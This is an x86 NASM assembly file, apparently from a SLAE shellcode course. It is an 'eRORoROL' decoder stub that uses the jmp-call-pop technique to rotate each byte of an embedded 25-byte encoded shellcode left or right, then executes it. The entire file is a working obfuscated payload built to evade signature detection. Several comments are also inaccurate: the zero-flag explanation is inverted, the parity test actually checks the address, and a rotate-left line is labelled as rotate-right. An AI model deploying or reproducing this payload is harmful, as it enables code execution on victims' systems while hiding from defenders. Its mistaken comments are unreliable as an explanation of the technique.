; Title: 	eRORoROL-decoder.nasm 	
; Author: 	Anastasios Monachos (secuid0) - [anastasiosm (at) gmail (dot) com]
; 		SLAE-461
; Description:	If index number is Even do a ROR, else do a ROL 

global _start

section .text
_start:
	jmp short call_shellcode

decoder:
	pop esi         ;shellcode on ESI
	xor ecx,ecx	;our loop counter
	mov cl, shellcode_length	;mov cl, 25;shellcode_length 25 bytes

check_even_odd:
	test  si, 01h	;perform (si & 01h) discarding the result but set the eflags
			;set ZF to 1 if (the least significant bit of SI is 0)
			;EVEN: if_least_significant_bit_of_SI_is_0 AND 01h: result is 0 then ZF=0)
			;ODD:  if_least_significant_bit_of_SI_is_1 AND 01h: result is 1 then ZF=1) 
	je even_number	;if SI==0 then the number is even 
			;else execute the odd number section

odd_number:
        rol byte [esi], 0x1     ;ror decode with 1 offset
	jmp short inc_dec

even_number:
        ror byte [esi], 0x1     ;ror decode with 1 offset
	;jmp inc_dec

inc_dec:
	inc esi			;next instruction in the encoded shellcode
        loop check_even_odd	;loop uses for counter ECX
	jmp short shellcode

call_shellcode:
	call decoder
	shellcode: db 0x62,0x60,0xa0,0x34,0x5e,0x97,0xe6,0x34,0xd0,0x97,0xc4,0xb4,0xdc,0xc4,0xc7,0x28,0x13,0x71,0xa6,0xc4,0xc3,0x58,0x16,0xe6,0x01
	shellcode_length equ $-shellcode

